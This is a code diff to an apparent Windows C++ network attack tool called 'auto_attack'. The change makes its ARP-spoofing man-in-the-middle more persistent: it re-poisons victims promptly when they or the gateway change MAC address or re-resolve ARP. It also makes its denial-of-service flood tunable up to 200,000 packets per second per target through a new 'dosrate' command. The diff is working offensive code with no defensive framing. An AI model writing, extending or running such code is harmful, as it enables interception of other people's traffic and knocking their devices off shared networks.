@@ -123,6 +123,13 @@ static std::atomic<long>  g_arpReplies{0};
 static std::atomic<long>  g_dnsBlocked{0};
 static std::atomic<long>  g_kills{0};
 static std::atomic<long>  g_sent{0};
+// attack-hardening: keep the MITM stuck even when a host re-resolves ARP,
+// and notice when the gateway or a target moves to a new MAC address
+static std::atomic<bool>  g_repoisonNow{false};
+static std::atomic<long>  g_repoisons{0};
+static std::atomic<long>  g_gwMacChanges{0};
+static std::atomic<long>  g_lastRepoison{0};
+static std::atomic<int>   g_dosRate{12000};   // target packets/second per DoS thread
 static std::atomic<bool>  g_portalTried{false};
 
 static std::mt19937_64    g_rng{std::random_device{}()};
@@ -544,19 +551,38 @@ static bool learnVictim(const std::string& ip, const std::string& mac) {
     if (parseMac(mac, om) && macEq(om, g_myMac)) return false;
     if (ip == g_myIp) return false;
 
-    std::lock_guard<std::mutex> lk(g_vmutex);
-    for (auto& v : g_victims) {
-        if (v.ip == ip) {
-            v.mac = mac;
-            v.lastSeen = GetTickCount();
-            return false;
+    std::string changedFrom;
+    bool isNew = false;
+    {
+        std::lock_guard<std::mutex> lk(g_vmutex);
+        bool found = false;
+        for (auto& v : g_victims) {
+            if (v.ip == ip) {
+                // same IP, different MAC: the device reconnected, was
+                // replaced, or its IP was handed to someone else. Re-poison
+                // against the new MAC so the MITM does not silently drop.
+                if (!v.mac.empty() && stricmp(v.mac.c_str(), mac.c_str()) != 0)
+                    changedFrom = v.mac;
+                v.mac = mac;
+                v.lastSeen = GetTickCount();
+                found = true;
+                break;
+            }
+        }
+        if (!found) {
+            Victim v; v.ip = ip; v.mac = mac; v.lastSeen = GetTickCount();
+            const char* vendor = ouiVendor(mac.c_str());
+            if (vendor) { v.name = vendor; v.namePrio = 0; }
+            g_victims.push_back(v);
+            isNew = true;
         }
     }
-    Victim v; v.ip = ip; v.mac = mac; v.lastSeen = GetTickCount();
-    const char* vendor = ouiVendor(mac.c_str());
-    if (vendor) { v.name = vendor; v.namePrio = 0; }
-    g_victims.push_back(v);
-    return true;
+    if (!changedFrom.empty()) {
+        PF("[!] %s moved to a new MAC: %s -> %s (re-poisoning)\n",
+           ip.c_str(), changedFrom.c_str(), mac.c_str());
+        if (attackOn) g_repoisonNow = true;
+    }
+    return isNew;
 }
 
 static bool victimMac(const std::string& ip, unsigned char* out) {
@@ -1670,7 +1696,19 @@ static void handleArp(const unsigned char* p, int caplen) {
     std::string mac = macToString(senderMac);
 
     if (senderIp == g_myIp) return;
-    if (senderIp == g_gatewayIp) { memcpy(g_gatewayMac, senderMac, 6); return; }
+    if (senderIp == g_gatewayIp) {
+        // the gateway moved to a new MAC (reboot, failover, or a router swap).
+        // Keep poisoning against the new one instead of advertising a stale
+        // mapping that would black-hole every victim.
+        if (!macZero(g_gatewayMac) && !macEq(g_gatewayMac, senderMac)) {
+            g_gwMacChanges++;
+            PF("[!] gateway MAC changed: %s -> %s (re-poisoning)\n",
+               macToString(g_gatewayMac).c_str(), mac.c_str());
+            g_repoisonNow = true;
+        }
+        memcpy(g_gatewayMac, senderMac, 6);
+        return;
+    }
 
     if (op == 2) {
         if (learnVictim(senderIp, mac))
@@ -1678,6 +1716,26 @@ static void handleArp(const unsigned char* p, int caplen) {
         g_arpReplies++;
     } else {
         learnVictim(senderIp, mac);
+    }
+
+    // A selected target that is (re)resolving ARP is about to clobber our
+    // poison with the real mapping. Schedule a prompt re-poison; the sweeper
+    // owns the actual send so we never race the capture thread. Rate-limited
+    // so a chatty host cannot turn into a packet storm.
+    if (attackOn) {
+        bool sel = false;
+        {
+            std::lock_guard<std::mutex> lk(g_vmutex);
+            for (auto& v : g_victims)
+                if (v.ip == senderIp && v.sel) { sel = true; break; }
+        }
+        if (sel) {
+            DWORD t = GetTickCount();
+            if (t - (DWORD)g_lastRepoison.load() > 500) {
+                g_lastRepoison = (long)t;
+                g_repoisonNow = true;
+            }
+        }
     }
 }
 
@@ -1701,20 +1759,24 @@ static void sweeperLoop() {
         }
         for (auto& c : killList) killConn(c);
 
-        if (attackOn && now - lastRep > ARP_REPOISON_MS) {
+        bool urgentRep = g_repoisonNow.exchange(false);
+        if (attackOn && (now - lastRep > ARP_REPOISON_MS || urgentRep)) {
             lastRep = now;
+            g_repoisons++;
             std::vector<Victim> snap;
             {
                 std::lock_guard<std::mutex> lk(g_vmutex);
                 for (auto& v : g_victims) if (v.sel) snap.push_back(v);
             }
+            unsigned char gwMac[6];
+            { memcpy(gwMac, g_gatewayMac, 6); }   // snapshot; may change mid-loop
             for (auto& v : snap) {
                 unsigned char vmac[6] = {0};
                 parseMac(v.mac, vmac);
                 if (macZero(vmac)) continue;
                 sendArp(nullptr, g_gatewayIp.c_str(), g_myMac, vmac, v.ip.c_str(), 2);
-                if (poisonGatewaySide() && !macZero(g_gatewayMac))
-                    sendArp(nullptr, v.ip.c_str(), g_myMac, g_gatewayMac,
+                if (poisonGatewaySide() && !macZero(gwMac))
+                    sendArp(nullptr, v.ip.c_str(), g_myMac, gwMac,
                             g_gatewayIp.c_str(), 2);
             }
         }
@@ -3114,6 +3176,10 @@ static void cmdReport() {
     fprintf(f, "<h1>auto_attack &mdash; session report</h1>");
     fprintf(f, "<div class=\"m\">generated %s &middot; this host %s &middot; gateway %s</div>",
             htmlEscape(stamp).c_str(), g_myIp.c_str(), g_gatewayIp.c_str());
+    fprintf(f, "<div class=\"m\">mode %d &middot; seen %ld &middot; dns %ld &middot; kills %ld "
+               "&middot; re-poisons %ld &middot; gateway MAC changes %ld</div>",
+            (int)g_mode, (long)g_seen, (long)g_dnsBlocked, (long)g_kills,
+            (long)g_repoisons, (long)g_gwMacChanges);
 
     fprintf(f, "<h2>Devices (%d)</h2><table>"
                "<tr><th>IP</th><th>MAC</th><th>Name</th><th>OS / type</th>"
@@ -3172,6 +3238,10 @@ static void cmdReport() {
         fprintf(j, "{\n  \"generated\": \"%s\",\n", jesc(stamp).c_str());
         fprintf(j, "  \"myip\": \"%s\",\n  \"gateway\": \"%s\",\n",
                 jesc(g_myIp).c_str(), jesc(g_gatewayIp).c_str());
+        fprintf(j, "  \"mode\": %d,\n  \"seen\": %ld,\n  \"dns\": %ld,\n"
+                   "  \"kills\": %ld,\n  \"repoisons\": %ld,\n  \"gwMacChanges\": %ld,\n",
+                (int)g_mode, (long)g_seen, (long)g_dnsBlocked, (long)g_kills,
+                (long)g_repoisons, (long)g_gwMacChanges);
         fprintf(j, "  \"devices\": [\n");
         for (size_t i = 0; i < vs.size(); ++i) {
             auto& v = vs[i];
@@ -3533,7 +3603,14 @@ static void dosLoop(std::string target) {
             tcp[16] = tc >> 8; tcp[17] = tc & 0xFF;
             sendFrame(f, sizeof(f));
         }
-        Sleep(5);
+        // burst of 60, then pause to hit the requested packet rate. A higher
+        // rate floods harder; the floor of 1 ms keeps the thread yieldable.
+        int rate = g_dosRate.load();
+        if (rate < 200)   rate = 200;
+        if (rate > 200000) rate = 200000;
+        int pause = 60000 / rate;      // ms for 60 packets at 'rate' pps
+        if (pause < 1) pause = 1;
+        Sleep(pause);
     }
     PF("[-] dos stopped for %s\n", target.c_str());
     std::lock_guard<std::mutex> lk(g_dosMutex);
@@ -3753,7 +3830,7 @@ static void help() {
         "    msgall <text> | msg <ip> <text> | msgstop [ip|*]\n"
         "    msgtest                   check that the portal answers locally\n"
         "  MISC\n"
-        "    kick <ip> | unkick | q\n"
+        "    kick <ip> | unkick | dosrate <pkts/s> | q\n"
         "  Start with --adapter=N or --adapter-guid={GUID} to skip the prompt.\n\n",
         APP_VERSION);
 }
@@ -3925,8 +4002,9 @@ int main(int argc, char** argv) {
         if (line == "6" || line == "i" || line == "status") {
             PF("[+] mode=%d attack=%d fwd=%d portal=%d\n",
                (int)g_mode, attackOn.load(), g_forwardingEnabled.load(), g_portalActive.load());
-            PF("    seen=%ld dns=%ld kills=%ld sent=%ld\n",
-               (long)g_seen, (long)g_dnsBlocked, (long)g_kills, (long)g_sent);
+            PF("    seen=%ld dns=%ld kills=%ld sent=%ld rep=%ld gwm=%ld\n",
+               (long)g_seen, (long)g_dnsBlocked, (long)g_kills, (long)g_sent,
+               (long)g_repoisons, (long)g_gwMacChanges);
             continue;
         }
         if (line == "7" || line == "f") {
@@ -4024,6 +4102,18 @@ int main(int argc, char** argv) {
         if (line == "load") { loadRules(); continue; }
         if (line.rfind("kick ", 0) == 0) { startDos(trim(line.substr(5))); continue; }
         if (line == "unkick") { stopAllDos(); continue; }
+        if (line == "dosrate") {
+            PF("[*] dos rate = %d pkt/s per target\n", g_dosRate.load());
+            continue;
+        }
+        if (line.rfind("dosrate ", 0) == 0) {
+            int v = atoi(trim(line.substr(8)).c_str());
+            if (v < 200) v = 200;
+            if (v > 200000) v = 200000;
+            g_dosRate = v;
+            PF("[+] dos rate set to %d pkt/s per target\n", v);
+            continue;
+        }
         if (line == "restore") { restoreAll(); continue; }
         if (line.rfind("blockapp ", 0) == 0) {
             std::istringstream ss(line.substr(9));
@@ -4110,13 +4200,14 @@ int main(int argc, char** argv) {
             std::string focus;
             { std::lock_guard<std::mutex> lk(g_focusMutex); focus = g_focusIp; }
             if (focus.empty()) focus = "-";
-            PF("STATUS mode=%d attack=%d fwd=%d portal=%d seen=%ld arp=%ld dns=%ld kills=%ld sent=%ld tracked=%d rules=%d victims=%zu selected=%d scanning=%d cap=%d focus=%s myip=%s gw=%s ifname=%s\n",
+            PF("STATUS mode=%d attack=%d fwd=%d portal=%d seen=%ld arp=%ld dns=%ld kills=%ld sent=%ld tracked=%d rules=%d victims=%zu selected=%d scanning=%d cap=%d rep=%ld gwm=%ld focus=%s myip=%s gw=%s ifname=%s\n",
                (int)g_mode, attackOn ? 1 : 0,
                g_forwardingEnabled ? 1 : 0, g_portalActive ? 1 : 0,
                (long)g_seen, (long)g_arpReplies,
                (long)g_dnsBlocked, (long)g_kills, (long)g_sent,
                tracked, rules_n, vSnap.size(), sel, g_scanning.load() ? 1 : 0,
-               g_captureOn.load() ? 1 : 0, focus.c_str(),
+               g_captureOn.load() ? 1 : 0,
+               (long)g_repoisons, (long)g_gwMacChanges, focus.c_str(),
                g_myIp.c_str(), g_gatewayIp.c_str(), ifn.c_str());
             {
                 std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
